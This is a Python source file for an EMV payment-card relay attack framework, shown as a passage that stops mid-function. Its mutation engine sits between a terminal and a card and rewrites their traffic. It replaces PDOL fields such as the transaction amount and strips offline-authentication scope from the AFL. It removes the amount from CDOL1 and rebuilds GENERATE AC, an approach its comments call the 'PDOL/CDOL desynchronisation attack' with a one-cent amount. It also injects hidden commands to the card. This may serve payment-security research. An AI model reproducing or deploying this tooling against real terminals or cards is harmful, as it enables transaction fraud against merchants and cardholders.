"""
mutation_engine.py – Layer 3: Controlled Mutations

Sits between the terminal and the relay card OS, wrapping
InterceptAttack.user_execute().  Three orthogonal mutation types:

  1. PDOL field mutation
       Intercepts the GPO command (CLA=80 INS=A8) before it reaches the
       card, parses the terminal's PDOL-response data using the PDOL
       structure captured from the preceding SELECT FCI, and replaces
       specific field values (e.g. TTQ, Amount, Country Code).

  2. Response TLV mutation
       Intercepts the card's response after os.execute(), finds specific
       TLV tags, and modifies their values before the terminal sees them.
       Supported modes: replace | delete | xor | flip_bit | prepend | append

  3. Command injection
       Fires additional APDUs to the card at defined transaction flow
       points (after_response, before_command) without the terminal
       knowing.  Responses are logged but never forwarded upstream.

Integration into intercept_attack.py
──────────────────────────────────────
    from mutation_engine import MutationEngine
    self._mut = MutationEngine.from_config("mutations.yaml", os=self.os)

    def user_execute(self, msg):
        msg = self._emv.on_command(msg)          # logging
        msg = self._mut.on_command(msg)          # mutations + injections
        ans = self.os.execute(msg)
        ans = self._mut.on_response(msg, ans)    # mutations + injections
        ans = self._emv.on_response(msg, ans)    # logging
        return ans

CLI standalone test
────────────────────
    python3 mutation_engine.py --mode stdin --config mutations.yaml
"""

from __future__ import annotations

import copy
import dataclasses
import json
import logging
import time
import uuid
from pathlib import Path
from typing import Any

try:
    from emv_logger import (
        parse_tlv, EMV_TAGS, TLVNode,
        _to_bytes,
    )
    from card_fingerprint import PDOLEntry
except ImportError as _e:
    raise ImportError(
        "mutation_engine requires emv_logger.py and card_fingerprint.py "
        f"in the same directory. ({_e})"
    )

log = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# CHUNK 1 – Constants and helpers
# ─────────────────────────────────────────────────────────────────────────────

# Recognised mutation modes for response-TLV mutations
MUTATION_MODES = frozenset({
    "replace",    # overwrite value with spec.value
    "delete",     # remove the tag entirely
    "splice",     # overwrite spec.value at spec.offset, leaving the rest alone
    "xor",        # XOR original bytes with spec.value (zero-pad shorter)
    "flip_bit",   # flip a single bit; spec.bit_position = 0-based from MSB
    "prepend",    # spec.value + original
    "append",     # original + spec.value
})

# Transaction flow INS bytes we track for injection triggers
_FLOW_INS: dict[str, str] = {
    "A4": "SELECT",
    "A8": "GPO",
    "B2": "READ_RECORD",
    "B0": "READ_BINARY",
    "AE": "GENERATE_AC",
    "88": "INTERNAL_AUTH",
    "CA": "GET_DATA",
    "C0": "GET_RESPONSE",
    "20": "VERIFY",
    "82": "EXTERNAL_AUTH",
}

# Built-in default config (merged with user YAML)
_DEFAULT_CONFIG: dict[str, Any] = {
    "enabled": True,
    "log_mutations": True,
    "log_path": "logs/mutations.jsonl",
    "pdol_mutations": [],
    "response_mutations": [],
    "injected_commands": [],
    "afl_mutations": [],
    "dol_mutations": [],
}

# ─────────────────────────────────────────────────────────────────────────────
# CHUNK 2 – Dataclasses
# ─────────────────────────────────────────────────────────────────────────────

@dataclasses.dataclass
class PDOLFieldMutation:
    """Override a single PDOL field in the GPO command data."""
    tag: str               # hex tag, e.g. "9F66" (TTQ)
    value: str             # hex replacement value (must match PDOL declared length)
    enabled: bool = True
    comment: str = ""

    def __post_init__(self) -> None:
        self.tag = self.tag.upper()
        self.value = self.value.upper().replace(" ", "")

    @classmethod
    def from_dict(cls, d: dict) -> "PDOLFieldMutation":
        return cls(
            tag=d["tag"],
            value=d["value"],
            enabled=d.get("enabled", True),
            comment=d.get("comment", ""),
        )


@dataclasses.dataclass
class ResponseTagMutation:
    """Mutate a TLV tag in the card's response before the terminal sees it."""
    tag: str               # hex tag to target
    mode: str              # one of MUTATION_MODES
    value: str = ""        # hex; used by replace/xor/flip_bit/prepend/append
    bit_position: int = 0  # 0-based from MSB; only for flip_bit
    offset: int = 0        # byte offset into the value; only for splice
    enabled: bool = True
    comment: str = ""
    # Optional: only mutate on specific commands (INS bytes as hex strings)
    on_ins: list = dataclasses.field(default_factory=list)

    def __post_init__(self) -> None:
        self.tag = self.tag.upper()
        self.value = self.value.upper().replace(" ", "")
        self.mode = self.mode.lower()
        self.on_ins = [i.upper() for i in self.on_ins]
        if self.mode not in MUTATION_MODES:
            raise ValueError(f"Unknown mutation mode {self.mode!r}; valid: {MUTATION_MODES}")

    @classmethod
    def from_dict(cls, d: dict) -> "ResponseTagMutation":
        return cls(
            tag=d["tag"],
            mode=d["mode"],
            value=d.get("value", ""),
            bit_position=int(d.get("bit_position", 0)),
            offset=int(d.get("offset", 0)),
            enabled=d.get("enabled", True),
            comment=d.get("comment", ""),
            on_ins=d.get("on_ins", []),
        )


@dataclasses.dataclass
class InjectedCommand:
    """Fire an extra APDU to the card at a defined transaction flow point."""
    apdu: str                # hex APDU to send
    trigger_ins: str         # INS byte that triggers this injection (hex)
    when: str = "after_response"  # "after_response" | "before_command"
    repeat: bool = False     # fire on every matching INS (True) or once (False)
    enabled: bool = True
    comment: str = ""
    # Internal state – not serialised
    _fired: bool = dataclasses.field(default=False, init=False, repr=False, compare=False)

    def __post_init__(self) -> None:
        self.apdu = self.apdu.upper().replace(" ", "")
        self.trigger_ins = self.trigger_ins.upper()
        self.when = self.when.lower()
        if self.when not in {"after_response", "before_command"}:
            raise ValueError(f"InjectedCommand.when must be 'after_response' or 'before_command', got {self.when!r}")

    @classmethod
    def from_dict(cls, d: dict) -> "InjectedCommand":
        return cls(
            apdu=d["apdu"],
            trigger_ins=d["trigger_ins"],
            when=d.get("when", "after_response"),
            repeat=d.get("repeat", False),
            enabled=d.get("enabled", True),
            comment=d.get("comment", ""),
        )

    def reset(self) -> None:
        self._fired = False


@dataclasses.dataclass
class MutationRecord:
    """Log record for a single mutation event."""
    ts_ms: int
    session_id: str
    direction: str          # "command" | "response"
    mutation_type: str      # "pdol" | "response_tag" | "injection"
    tag: str                # affected tag (empty for injection)
    mode: str               # mutation mode or "inject"
    original_hex: str
    mutated_hex: str
    ins: str                # INS of the triggering command
    comment: str = ""

    def to_dict(self) -> dict:
        return dataclasses.asdict(self)

    def to_json(self) -> str:
        return json.dumps(self.to_dict())


@dataclasses.dataclass
class SessionState:
    """Ephemeral per-transaction session state tracked by MutationEngine."""
    session_id: str = dataclasses.field(default_factory=lambda: str(uuid.uuid4()))
    pdol_entries: list = dataclasses.field(default_factory=list)   # list[PDOLEntry]
    afl_records: list = dataclasses.field(default_factory=list)    # list of raw bytes
    last_ins: str = ""
    last_cmd: bytes = b""
    aid: str = ""
    started_at: float = dataclasses.field(default_factory=time.time)
    # T=0 GET RESPONSE chaining: INS/cmd that returned 61 XX, cleared on C0
    pre_get_response_ins: str = ""
    pre_get_response_cmd: bytes = b""
    # CDOL1 state for GENERATE AC reconstruction after DOL field-removal mutations
    cdol1_original_entries: list = dataclasses.field(default_factory=list)
    cdol1_mutated_entries: list = dataclasses.field(default_factory=list)

    def reset(self) -> None:
        self.session_id = str(uuid.uuid4())
        self.pdol_entries = []
        self.afl_records = []
        self.last_ins = ""
        self.last_cmd = b""
        self.aid = ""
        self.started_at = time.time()
        self.pre_get_response_ins = ""
        self.pre_get_response_cmd = b""
        self.cdol1_original_entries = []
        self.cdol1_mutated_entries = []


# ── AFL mutations ─────────────────────────────────────────────────────────────

_AFL_MODES = frozenset({"skip_signed", "truncate", "remove_sfi", "extend"})


@dataclasses.dataclass
class AFLMutation:
    """
    Modify the Application File Locator (tag 94) in the GPO response.

    Modes
    -----
    skip_signed  – zero offline_auth_records on every entry, removing all
                   records from the SDA/DDA signing scope (defeats offline auth)
    truncate     – keep only the first `truncate_to` AFL entries; the terminal
                   will not read the dropped records
    remove_sfi   – drop every entry whose SFI matches `target_sfi`
    extend       – append `extra_entries` to the AFL, pointing at records that
                   may not exist (fuzzes terminal error handling)
    """
    mode: str
    truncate_to: int = 0
    target_sfi: int = 0
    extra_entries: list = dataclasses.field(default_factory=list)
    enabled: bool = True
    comment: str = ""

    def __post_init__(self) -> None:
        self.mode = self.mode.lower()
        if self.mode not in _AFL_MODES:
            raise ValueError(f"Unknown AFLMutation mode {self.mode!r}; valid: {_AFL_MODES}")

    @classmethod
    def from_dict(cls, d: dict) -> "AFLMutation":
        return cls(
            mode=d["mode"],
            truncate_to=int(d.get("truncate_to", 0)),
            target_sfi=int(d.get("target_sfi", 0)),
            extra_entries=d.get("extra_entries", []),
            enabled=d.get("enabled", True),
            comment=d.get("comment", ""),
        )


# ── DOL mutations ─────────────────────────────────────────────────────────────

_DOL_MODES = frozenset({"remove_field", "truncate"})
_DOL_TAGS  = frozenset({"8C", "8D"})      # CDOL1, CDOL2


@dataclasses.dataclass
class DOLMutation:
    """
    Modify a Data Object List tag — CDOL1 (8C) or CDOL2 (8D) — found in
    READ RECORD responses.

    Modes
    -----
    remove_field – strip the entry for `field_tag` from the DOL; the terminal
                   will not include that data element in GENERATE AC, so the
                   card's cryptogram won't bind to it (e.g. remove 9F02 →
                   amount not in AC, enabling PDOL/CDOL amount desynchronisation)
    truncate     – keep only the first `truncate_to` DOL field declarations
    """
    target_tag: str          # "8C" (CDOL1) or "8D" (CDOL2)
    mode: str
    field_tag: str = ""      # for remove_field: the DOL field tag to strip
    truncate_to: int = 0     # for truncate: keep first N fields
    enabled: bool = True
    comment: str = ""

    def __post_init__(self) -> None:
        self.target_tag = self.target_tag.upper()
        self.field_tag  = self.field_tag.upper()
        self.mode       = self.mode.lower()
        if self.target_tag not in _DOL_TAGS:
            raise ValueError(f"DOLMutation.target_tag must be 8C or 8D, got {self.target_tag!r}")
        if self.mode not in _DOL_MODES:
            raise ValueError(f"Unknown DOLMutation mode {self.mode!r}; valid: {_DOL_MODES}")

    @classmethod
    def from_dict(cls, d: dict) -> "DOLMutation":
        return cls(
            target_tag=d["target_tag"],
            mode=d["mode"],
            field_tag=d.get("field_tag", ""),
            truncate_to=int(d.get("truncate_to", 0)),
            enabled=d.get("enabled", True),
            comment=d.get("comment", ""),
        )


# ─────────────────────────────────────────────────────────────────────────────
# CHUNK 3 – TLV rewriter helpers
# ─────────────────────────────────────────────────────────────────────────────

def _serialize_tag(tag_hex: str) -> bytes:
    """Convert a hex tag string to its canonical byte encoding."""
    tag_hex = tag_hex.upper().replace(" ", "")
    if len(tag_hex) % 2:
        tag_hex = "0" + tag_hex
    return bytes.fromhex(tag_hex)


def _serialize_length(length: int) -> bytes:
    """BER-TLV length encoding."""
    if length < 0x80:
        return bytes([length])
    elif length <= 0xFF:
        return bytes([0x81, length])
    elif length <= 0xFFFF:
        return bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])
    raise ValueError(f"TLV length {length} too large to encode")


def serialize_tlv(nodes: list) -> bytes:
    """Re-serialise a list of TLVNode objects back to BER-TLV bytes."""
    out = bytearray()
    for node in nodes:
        tag_bytes = _serialize_tag(node.tag)
        if node.children:
            value_bytes = serialize_tlv(node.children)
        else:
            value_bytes = bytes(node.value) if not isinstance(node.value, (bytes, bytearray)) else node.value
        out += tag_bytes
        out += _serialize_length(len(value_bytes))
        out += value_bytes
    return bytes(out)


def _compute_new_value(spec: "ResponseTagMutation", original: bytes) -> bytes | None:
    """
    Apply the mutation mode to `original` bytes.
    Returns the new value bytes, or None if the tag should be deleted.
    """
    mode = spec.mode

    if mode == "delete":
        return None

    if mode == "replace":
        return bytes.fromhex(spec.value) if spec.value else b""

    if mode == "prepend":
        return bytes.fromhex(spec.value) + original

    if mode == "append":
        return original + bytes.fromhex(spec.value)

    if mode == "splice":
        # Overwrite a run of bytes in place and leave everything around it as
        # the card sent it. The length is deliberately preserved: a splice that
        # resized the value would shift every byte after it, which is a
        # different mutation wearing this one's name — and for a tag inside a
        # signed template it would invalidate far more than intended.
        patch = bytes.fromhex(spec.value) if spec.value else b""
        if not patch:
            return original
        offset = spec.offset
        if offset < 0:
            raise ValueError(f"splice offset {offset} is negative")
        if offset + len(patch) > len(original):
            raise ValueError(
                f"splice of {len(patch)} byte(s) at offset {offset} runs past "
                f"the end of a {len(original)}-byte value. Use 'replace' to "
                f"change the length, or 'append' to extend it."
            )
        result = bytearray(original)
        result[offset:offset + len(patch)] = patch
        return bytes(result)

    if mode == "xor":
        mask = bytes.fromhex(spec.value) if spec.value else b""
        result = bytearray(original)
        for i in range(min(len(result), len(mask))):
            result[i] ^= mask[i]
        return bytes(result)

    if mode == "flip_bit":
        if not original:
            return original
        result = bytearray(original)
        bit_pos = spec.bit_position  # 0-based from MSB of the entire value
        byte_idx = bit_pos // 8
        bit_idx = 7 - (bit_pos % 8)  # MSB-first within the byte
        if byte_idx < len(result):
            result[byte_idx] ^= (1 << bit_idx)
        return bytes(result)

    raise ValueError(f"Unknown mode {mode!r}")


def _apply_mutations_to_nodes(
    nodes: list,
    spec: "ResponseTagMutation",
    records: list,
) -> list:
    """
    Walk the TLVNode tree, applying `spec` to every node whose tag matches.
    Appends a MutationRecord for each application to `records`.
    Returns a new node list (deleted tags are omitted).
    """
    result = []
    for node in nodes:
        if node.tag == spec.tag:
            original_bytes: bytes
            if node.children:
                original_bytes = serialize_tlv(node.children)
            else:
                original_bytes = bytes(node.value) if not isinstance(node.value, (bytes, bytearray)) else node.value

            new_bytes = _compute_new_value(spec, original_bytes)

            if (
                new_bytes is not None
                and spec.mode == "replace"
                and len(new_bytes) != len(original_bytes)
            ):
                log.warning(
                    "T=0 length warning: tag %s replace mutation changed value "
                    "length %d → %d bytes; response will be %+d bytes — may cause "
                    "Le mismatch on contact (T=0) cards and trigger a transaction "
                    "restart. Use a replacement value of the same byte length.",
                    spec.tag,
                    len(original_bytes),
                    len(new_bytes),
                    len(new_bytes) - len(original_bytes),
                )

            records.append(MutationRecord(
                ts_ms=int(time.time() * 1000),
                session_id="",  # filled in by caller
                direction="response",
                mutation_type="response_tag",
                tag=spec.tag,
                mode=spec.mode,
                original_hex=original_bytes.hex().upper(),
                mutated_hex=new_bytes.hex().upper() if new_bytes is not None else "(deleted)",
                ins="",
                comment=spec.comment,
            ))

            if new_bytes is None:
                continue  # delete: skip node

            # Rebuild the node with the new value (shallow copy, update value)
            new_node = copy.copy(node)
            new_node.value = new_bytes
            new_node.children = []
            result.append(new_node)
        else:
            # Recurse into constructed TLVs
            if node.children:
                child_records: list = []
                new_children = _apply_mutations_to_nodes(node.children, spec, child_records)
                records.extend(child_records)
                new_node = copy.copy(node)
                new_node.children = new_children
                result.append(new_node)
            else:
                result.append(node)
    return result


def mutate_tag_in_response(
    raw: bytes,
    spec: "ResponseTagMutation",
    session_id: str = "",
) -> tuple[bytes, list]:
    """
    Parse `raw` as BER-TLV, apply `spec`, re-serialise.
    Returns (mutated_bytes, list[MutationRecord]).
    Leaves the trailing SW bytes (last 2) intact.
    """
    if len(raw) < 2:
        return raw, []

    sw = raw[-2:]
    body = raw[:-2]

    try:
        nodes = parse_tlv(body)
    except Exception:
        return raw, []

    records: list = []
    new_nodes = _apply_mutations_to_nodes(nodes, spec, records)

    for rec in records:
        rec.session_id = session_id

    new_body = serialize_tlv(new_nodes)
    return new_body + sw, records


def _pad_tlv_response_to_length(raw_resp: bytes, target_len: int) -> bytes:
    """
    Restore a shortened BER-TLV response to `target_len` bytes by appending
    ISO/IEC 7816-4 §5.2.2 padding (0xFF bytes) inside the outermost TLV
    template and updating its length field.

    This is the T=0 Le-preservation mechanism: any mutation that removes or
    shrinks a tag (DOL remove_field, response delete, AFL truncate/remove_sfi,
    response replace with shorter value) reduces the response below the Le
    negotiated via the card's preceding `6C XX` status word, causing the
    terminal to restart the transaction. Appending 0xFF inside the outer
    template preserves the wire length without altering any meaningful data.
    """
    if len(raw_resp) >= target_len:
        return raw_resp

    delta = target_len - len(raw_resp)
    sw = raw_resp[-2:]
    body = raw_resp[:-2]

    if len(body) < 2:
        log.warning("T=0 pad: body too short (%d bytes), cannot add %d bytes", len(body), delta)
        return raw_resp

    # Locate outermost TLV tag bytes
    pos = 0
    b = body[pos]; pos += 1
    if (b & 0x1F) == 0x1F:          # multi-byte tag
        while pos < len(body):
            b2 = body[pos]; pos += 1
            if not (b2 & 0x80):
                break
    tag_end = pos

    if pos >= len(body):
        log.warning("T=0 pad: no length byte found after tag, cannot pad")
        return raw_resp

    # Decode BER-TLV length field
    l0 = body[pos]; pos += 1
    if l0 < 0x80:
        inner_len = l0
    elif l0 == 0x81:
        if pos >= len(body):
            log.warning("T=0 pad: truncated 0x81 length encoding, cannot pad")
            return raw_resp
        inner_len = body[pos]; pos += 1
    elif l0 == 0x82:
        if pos + 1 >= len(body):
            log.warning("T=0 pad: truncated 0x82 length encoding, cannot pad")
            return raw_resp
        inner_len = (body[pos] << 8) | body[pos + 1]; pos += 2
    else:
        log.warning("T=0 pad: unsupported length encoding 0x%02X, cannot pad", l0)
        return raw_resp

    value_start = pos
    actual_value_len = len(body) - value_start
    if actual_value_len != inner_len:
        log.warning(
            "T=0 pad: declared inner length %d != actual remaining %d, cannot pad safely",
            inner_len, actual_value_len,
        )
        return raw_resp

    new_inner_len = inner_len + delta
    new_len_bytes = _serialize_length(new_inner_len)
    new_body = body[:tag_end] + new_len_bytes + body[value_start:] + bytes([0xFF] * delta)

    log.info(
        "T=0 length preservation: padded response %d → %d bytes (+%d × 0xFF inside tag %s)",
        len(raw_resp), target_len, delta, body[:tag_end].hex().upper(),
    )
    return new_body + sw


def _reconstruct_genac_cmd(
    genac_apdu: bytes,
    original_entries: list,   # [{tag: str, length: int}] — full original CDOL1
    mutated_entries: list,    # [{tag: str, length: int}] — after field removals
) -> bytes:
    """
    Expand a GENERATE AC command built against a shortened CDOL1 back to the
    length that the card's original CDOL1 expects, by inserting zero-value
    placeholders for fields that were stripped by DOL remove_field mutations.

    Without this, a card that validates GENERATE AC Lc against its own CDOL1
    returns 67 00 (Wrong Length) and the transaction fails immediately.

    With this, the card computes a valid ARQC/TC but its cryptogram covers
    zero-filled values for the removed fields (e.g. Amount = 0, CVM Results = 0)
    while the terminal believes those fields were included — this is the
    PDOL/CDOL desynchronisation finding.
    """
    if len(genac_apdu) < 5:
        return genac_apdu

    header = genac_apdu[:4]   # CLA INS P1 P2
    lc = genac_apdu[4]
    has_le = (len(genac_apdu) == 5 + lc + 1) and (genac_apdu[-1] == 0x00)
    terminal_data = genac_apdu[5:5 + lc]

    expected_terminal_len = sum(e["length"] for e in mutated_entries)
    if len(terminal_data) != expected_terminal_len:
        log.warning(
            "GENAC reconstruct: terminal Lc=%d != expected %d from mutated CDOL1, skipping",
            len(terminal_data), expected_terminal_len,
        )
        return genac_apdu

    mut_tag_set = {e["tag"] for e in mutated_entries}
    if all(e["tag"] in mut_tag_set for e in original_entries):
        return genac_apdu  # no fields removed, nothing to reconstruct

    result = bytearray()
    term_pos = 0
    for entry in original_entries:
        tag = entry["tag"]
        length = entry["length"]
        if tag in mut_tag_set:
            result.extend(terminal_data[term_pos:term_pos + length])
            term_pos += length
        else:
            result.extend(b"\x00" * length)   # zero-fill removed field

    new_apdu = header + bytes([len(result)]) + bytes(result)
    if has_le:
        new_apdu += b"\x00"
    return new_apdu


# ─────────────────────────────────────────────────────────────────────────────
# CHUNK 4 – PDOL mutation engine
# ─────────────────────────────────────────────────────────────────────────────

def _parse_fci_for_pdol(fci_bytes: bytes) -> list:
    """
    Extract PDOL from SELECT FCI (tag 9F38 inside 6F → A5 template).
    Returns a list of PDOLEntry (tag, length) or [] if not found.
    """
    try:
        nodes = parse_tlv(fci_bytes[:-2])  # strip SW
    except Exception:
        return []

    def _find(nodes, target_tag):
        for n in nodes:
            if n.tag == target_tag:
                return n
            if n.children:
                found = _find(n.children, target_tag)
                if found:
                    return found
        return None

    pdol_node = _find(nodes, "9F38")
    if not pdol_node:
        return []

    raw = pdol_node.value if not isinstance(pdol_node.value, (bytes, bytearray)) else pdol_node.value
    if isinstance(raw, (list, bytearray)):
        raw = bytes(raw)

    # DOL is a sequence of (tag bytes)(length byte) pairs — no values
    entries: list[PDOLEntry] = []
    pos = 0
    while pos < len(raw):
        # tag
        if pos >= len(raw):
            break
        b = raw[pos]
        tag_bytes = bytes([b])
        pos += 1
        if (b & 0x1F) == 0x1F:  # multi-byte tag
            while pos < len(raw):
                b2 = raw[pos]
                tag_bytes += bytes([b2])
                pos += 1
                if not (b2 & 0x80):
                    break
        tag_hex = tag_bytes.hex().upper()
        if pos >= len(raw):
            break
        length = raw[pos]
        pos += 1
        name = EMV_TAGS.get(tag_hex, f"Unknown({tag_hex})")
        entries.append(PDOLEntry(tag=tag_hex, length=length, name=name))

    return entries


def _unpack_gpo_data(gpo_apdu: bytes, pdol_entries: list) -> dict[str, bytes]:
    """
    Given the GPO command APDU (CLA=80 INS=A8 ...) and the PDOL entry list,
    split the command data field (inside the 83-tag wrapper) into per-tag slices.
    Returns {tag_hex: value_bytes}.
    """
    # GPO: 80 A8 00 00 Lc [83 Lc_inner <data>] Le
    if len(gpo_apdu) < 6:
        return {}
    try:
        nodes = parse_tlv(gpo_apdu[5:-1] if gpo_apdu[-1:] == b'\x00' else gpo_apdu[5:])
    except Exception:
        return {}

    data_bytes = b""
    for n in nodes:
        if n.tag == "83":
            data_bytes = bytes(n.value) if not isinstance(n.value, (bytes, bytearray)) else n.value
            break

    if not data_bytes:
        # No 83 wrapper — data starts at offset 5
        data_bytes = gpo_apdu[5:]

    fields: dict[str, bytes] = {}
    pos = 0
    for entry in pdol_entries:
        end = pos + entry.length
        fields[entry.tag] = data_bytes[pos:end] if end <= len(data_bytes) else b"\x00" * entry.length
        pos = end

    return fields


def _rebuild_gpo_data(fields: dict[str, bytes], pdol_entries: list) -> bytes:
    """Concatenate per-tag field values in PDOL order to form the new data blob."""
    out = bytearray()
    for entry in pdol_entries:
        val = fields.get(entry.tag, b"\x00" * entry.length)
        # Ensure exactly entry.length bytes (truncate or zero-pad)
        val = val[:entry.length].ljust(entry.length, b"\x00")
        out += val
    return bytes(out)


def apply_pdol_mutations(
    gpo_apdu: bytes,
    pdol_entries: list,
    mutations: list,
    session_id: str = "",
) -> tuple[bytes, list]:
    """
    Given a GPO command APDU, PDOL layout, and a list of PDOLFieldMutation specs,
    return the (possibly modified) GPO APDU and a list of MutationRecord.

    Only mutations whose tag appears in the PDOL and whose `enabled` flag is True
    are applied.
    """
    if not pdol_entries or not mutations:
        return gpo_apdu, []

    fields = _unpack_gpo_data(gpo_apdu, pdol_entries)
    if not fields:
        return gpo_apdu, []

    records: list[MutationRecord] = []
    changed = False

    for spec in mutations:
        if not spec.enabled:
            continue
        tag = spec.tag
        if tag not in fields:
            log.debug("PDOL mutation: tag %s not in PDOL, skipping", tag)
            continue

        original = fields[tag]
        new_val = bytes.fromhex(spec.value)
        # Clamp/pad to PDOL-declared length
        declared_len = next((e.length for e in pdol_entries if e.tag == tag), len(new_val))
        new_val = new_val[:declared_len].ljust(declared_len, b"\x00")

        records.append(MutationRecord(
            ts_ms=int(time.time() * 1000),
            session_id=session_id,
            direction="command",
            mutation_type="pdol",
            tag=tag,
            mode="replace",
            original_hex=original.hex().upper(),
            mutated_hex=new_val.hex().upper(),
            ins="A8",
            comment=spec.comment,
        ))

        fields[tag] = new_val
        changed = True

    if not changed:
        return gpo_apdu, []

    new_data = _rebuild_gpo_data(fields, pdol_entries)

    # Reconstruct GPO APDU: keep first 4 header bytes, rebuild Lc + 83-wrapper + data
    inner = bytes([0x83, len(new_data)]) + new_data
    new_apdu = gpo_apdu[:4] + bytes([len(inner)]) + inner
    # Some implementations append Le=00
    if gpo_apdu[-1:] == b"\x00" and len(gpo_apdu) == 5 + len(inner) + 1:
        new_apdu += b"\x00"

    return new_apdu, records


# ─────────────────────────────────────────────────────────────────────────────
# CHUNK 5 – Response TLV mutation dispatcher
# ─────────────────────────────────────────────────────────────────────────────

def apply_response_mutations(
    response: bytes,
    ins: str,
    mutations: list,
    session_id: str = "",
) -> tuple[bytes, list]:
    """
    Apply every enabled ResponseTagMutation whose `on_ins` list is either empty
    (apply on all commands) or contains the current INS.

    Mutations are applied in order; each operates on the output of the previous.
    Returns (final_response_bytes, list[MutationRecord]).
    """
    all_records: list[MutationRecord] = []
    current = response

    for spec in mutations:
        if not spec.enabled:
            continue
        if spec.on_ins and ins.upper() not in spec.on_ins:
            continue

        current, records = mutate_tag_in_response(current, spec, session_id)
        for rec in records:
            rec.ins = ins
        all_records.extend(records)

    return current, all_records


# ─────────────────────────────────────────────────────────────────────────────
# CHUNK 5b – AFL mutation engine
# ─────────────────────────────────────────────────────────────────────────────

def _parse_afl_bytes(data: bytes) -> list[dict]:
    """Parse raw AFL bytes into a list of entry dicts (4 bytes each)."""
    entries = []
    for i in range(0, len(data) - 3, 4):
        b = data[i:i + 4]
        entries.append({
            "sfi":                (b[0] >> 3) & 0x1F,
            "first_record":       b[1],
            "last_record":        b[2],
            "offline_auth_records": b[3],
        })
    return entries


def _serialize_afl_bytes(entries: list[dict]) -> bytes:
    """Re-encode AFL entries into raw bytes."""
    out = bytearray()
    for e in entries:
        out.append((e["sfi"] << 3) & 0xF8)
        out.append(e["first_record"])
        out.append(e["last_record"])
        out.append(e["offline_auth_records"])
    return bytes(out)


def _apply_afl_spec(entries: list[dict], spec: "AFLMutation") -> tuple[list[dict], str]:
    """
    Apply a single AFLMutation spec to a list of AFL entry dicts.
    Returns (new_entries, description_of_change).
    """
    if spec.mode == "skip_signed":
        new = [{**e, "offline_auth_records": 0} for e in entries]
        desc = f"zeroed offline_auth_records on {len(new)} entries"

    elif spec.mode == "truncate":
        n = max(1, spec.truncate_to)
        new = entries[:n]
        desc = f"truncated from {len(entries)} to {len(new)} entries"

    elif spec.mode == "remove_sfi":
        new = [e for e in entries if e["sfi"] != spec.target_sfi]
        desc = f"removed {len(entries) - len(new)} entries for SFI={spec.target_sfi}"

    elif spec.mode == "extend":
        extras = [
            {
                "sfi":                  int(ex.get("sfi", 1)),
                "first_record":         int(ex.get("first_record", 1)),
                "last_record":          int(ex.get("last_record", 1)),
                "offline_auth_records": int(ex.get("offline_auth_records", 0)),
            }
            for ex in spec.extra_entries
        ]
        new = entries + extras
        desc = f"extended with {len(extras)} extra entries"

    else:
        new = entries
        desc = "no-op"

    return new, desc


def apply_afl_mutations(
    response: bytes,
    specs: list,
    session_id: str = "",
    ins: str = "",
) -> tuple[bytes, list]:
    """
    Find tag 94 (AFL) anywhere in the BER-TLV tree of `response`,
    apply every enabled AFLMutation spec in order, and re-serialise.
    Returns (mutated_response, list[MutationRecord]).
    """
    if len(response) < 3:
        return response, []

    sw   = response[-2:]
    body = response[:-2]

    try:
        nodes = parse_tlv(body)
    except Exception:
        return response, []

    all_records: list[MutationRecord] = []
    changed = False

    def _walk(node_list: list) -> list:
        nonlocal changed
        result = []
        for node in node_list:
            if node.tag == "94":
                raw_afl = bytes(node.value) if not isinstance(node.value, (bytes, bytearray)) else node.value
                entries = _parse_afl_bytes(raw_afl)
                if not entries:
                    result.append(node)
                    continue

                current_entries = entries
                for spec in specs:
                    if not spec.enabled:
                        continue
                    original_bytes = _serialize_afl_bytes(current_entries)
                    new_entries, desc = _apply_afl_spec(current_entries, spec)
                    new_bytes = _serialize_afl_bytes(new_entries)
                    all_records.append(MutationRecord(
                        ts_ms=int(time.time() * 1000),
                        session_id=session_id,
                        direction="response",
                        mutation_type="afl",
                        tag="94",
                        mode=spec.mode,
                        original_hex=original_bytes.hex().upper(),
                        mutated_hex=new_bytes.hex().upper(),
                        ins=ins,
                        comment=spec.comment or desc,
                    ))
                    current_entries = new_entries
                    changed = True

                import copy as _copy
                new_node = _copy.copy(node)
                new_node.value = _serialize_afl_bytes(current_entries)
                new_node.children = []
                result.append(new_node)
            elif node.children:
                import copy as _copy
                new_node = _copy.copy(node)
                new_node.children = _walk(node.children)
                result.append(new_node)
            else:
                result.append(node)
        return result

    new_nodes = _walk(nodes)
    if not changed:
        return response, []

    new_body = serialize_tlv(new_nodes)
    return new_body + sw, all_records


# ─────────────────────────────────────────────────────────────────────────────
# CHUNK 5c – DOL (CDOL1 / CDOL2) mutation engine
# ─────────────────────────────────────────────────────────────────────────────

def _parse_dol(data: bytes) -> list[dict]:
    """
    Parse a DOL (Data Object List) — a sequence of (tag)(length) pairs with
    no embedded values — into a list of {tag: str, length: int} dicts.
    Used for CDOL1 (8C), CDOL2 (8D), PDOL (9F38), etc.
    """
    entries = []
    pos = 0
    while pos < len(data):
        b = data[pos]
        tag_bytes = bytes([b])
        pos += 1
        if (b & 0x1F) == 0x1F:   # multi-byte tag
            while pos < len(data):
                b2 = data[pos]
                tag_bytes += bytes([b2])
                pos += 1
                if not (b2 & 0x80):
                    break
        if pos >= len(data):
            break
        length = data[pos]
        pos += 1
        entries.append({"tag": tag_bytes.hex().upper(), "length": length})
    return entries


def _serialize_dol(entries: list[dict]) -> bytes:
    """Re-encode a parsed DOL entry list back to raw bytes."""
    out = bytearray()
    for e in entries:
        out += bytes.fromhex(e["tag"])
        out.append(e["length"])
    return bytes(out)


def apply_dol_mutations(
    response: bytes,
    specs: list,
    session_id: str = "",
    ins: str = "",
) -> tuple[bytes, list, dict]:
    """
    Find CDOL1 (8C) and/or CDOL2 (8D) tags in the response TLV tree,
    apply every enabled DOLMutation whose target_tag matches, and re-serialise.

    Removing 9F02 (Amount) from CDOL1 means the terminal will not include
    the amount in the GENERATE AC data object → cryptogram has no amount binding.
    Paired with PDOL amount=1¢, this is the PDOL/CDOL desynchronisation attack.

    Returns (mutated_response, list[MutationRecord], dol_state) where
    dol_state = {target_tag: (original_entries, final_entries)} for any
    tag that was mutated — used by the engine to reconstruct GENERATE AC.
    """
    if len(response) < 3:
        return response, [], {}

    sw   = response[-2:]
    body = response[:-2]

    try:
        nodes = parse_tlv(body)
    except Exception:
        return response, [], {}

    all_records: list[MutationRecord] = []
    dol_state: dict = {}      # {target_tag: (original_entries, final_entries)}
    changed = False

    # Build per-tag spec map for quick lookup
    spec_map: dict[str, list] = {}
    for spec in specs:
        if spec.enabled:
